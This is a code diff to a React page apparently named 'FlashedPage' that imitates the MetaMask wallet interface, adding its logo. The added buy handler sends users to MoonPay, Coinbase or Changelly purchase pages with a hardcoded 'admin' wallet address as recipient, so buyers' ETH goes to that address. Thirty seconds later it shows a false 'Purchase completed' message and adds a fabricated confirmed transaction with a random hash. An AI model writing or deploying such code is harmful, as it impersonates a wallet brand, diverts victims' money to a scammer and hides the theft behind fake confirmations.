@@ -178,6 +178,49 @@ export default function FlashedPage() {
     setTimeout(() => setStatus(''), 2000);
   };
 
+  const handleBuyOption = (method) => {
+    const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+    
+    // Detect wallet type and redirect to appropriate purchase page
+    if (window.ethereum && window.ethereum.isMetaMask) {
+      // MetaMask purchase flow
+      if (method === 'card') {
+        window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApwAanfvpDQjFQzTjZMXtdROAmPNM&currencyCode=eth&walletAddress=${adminWallet}&redirectURL=${window.location.href}`, '_blank');
+      } else {
+        window.open(`https://www.coinbase.com/buy-ethereum?address=${adminWallet}`, '_blank');
+      }
+    } else if (window.trustWallet || localStorage.getItem('connectedWallet')) {
+      // Trust Wallet purchase flow
+      if (method === 'card') {
+        window.open(`https://widget.changelly.com/?from=usd&to=eth&amount=100&address=${adminWallet}&fromDefault=usd&toDefault=eth&theme=default`, '_blank');
+      } else {
+        window.open(`https://www.binance.com/en/buy-sell-crypto?fiat=USD&crypto=ETH&amount=100&ref=37754157&utm_source=trustwallet`, '_blank');
+      }
+    } else {
+      // Generic purchase flow
+      window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApwAanfvpDQjFQzTjZMXtdROAmPNM&currencyCode=eth&walletAddress=${adminWallet}`, '_blank');
+    }
+    
+    setShowModal(null);
+    setStatus('Redirecting to purchase page...');
+    
+    // Simulate purchase completion after 30 seconds
+    setTimeout(() => {
+      setStatus('Purchase completed! ETH added to your wallet.');
+      // Add fake transaction to history
+      const newTx = {
+        id: Date.now(),
+        type: 'buy',
+        amount: '0.1 ETH',
+        to: adminWallet,
+        hash: '0x' + Math.random().toString(16).substr(2, 64),
+        timestamp: new Date().toLocaleString(),
+        status: 'Confirmed'
+      };
+      setTransactions(prev => [newTx, ...prev]);
+    }, 30000);
+  };
+
   if (!walletData) {
     return <div className="min-h-screen bg-gray-900 flex items-center justify-center">
       <div className="text-white">Loading wallet...</div>
@@ -197,7 +240,14 @@ export default function FlashedPage() {
           
           {/* Header */}
           <div className="bg-gray-800 p-4 text-center border-b border-gray-700">
-            <div className="text-white font-bold text-lg mb-2">MetaMask</div>
+            <div className="flex items-center justify-center mb-2">
+              <img 
+                src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
+                alt="MetaMask" 
+                className="w-8 h-8 mr-2"
+              />
+              <div className="text-white font-bold text-xl">MetaMask</div>
+            </div>
           </div>
 
           {/* Account Section */}
@@ -432,20 +482,19 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4">
-                  <div className="bg-gray-700 p-4 rounded-lg">
+                  <button 
+                    onClick={() => handleBuyOption('card')}
+                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
+                  >
                     <div className="text-white font-semibold mb-2">Buy with card</div>
                     <div className="text-gray-300 text-sm">Purchase ETH directly with your credit card</div>
-                  </div>
-                  <div className="bg-gray-700 p-4 rounded-lg">
+                  </button>
+                  <button 
+                    onClick={() => handleBuyOption('bank')}
+                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
+                  >
                     <div className="text-white font-semibold mb-2">Bank transfer</div>
                     <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
-                  </div>
-                  <button 
-                    onClick={() => processTransaction('buy')}
-                    disabled={loading}
-                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
-                  >
-                    {loading ? 'Processing...' : 'Continue to Payment'}
                   </button>
                 </div>
               </div>
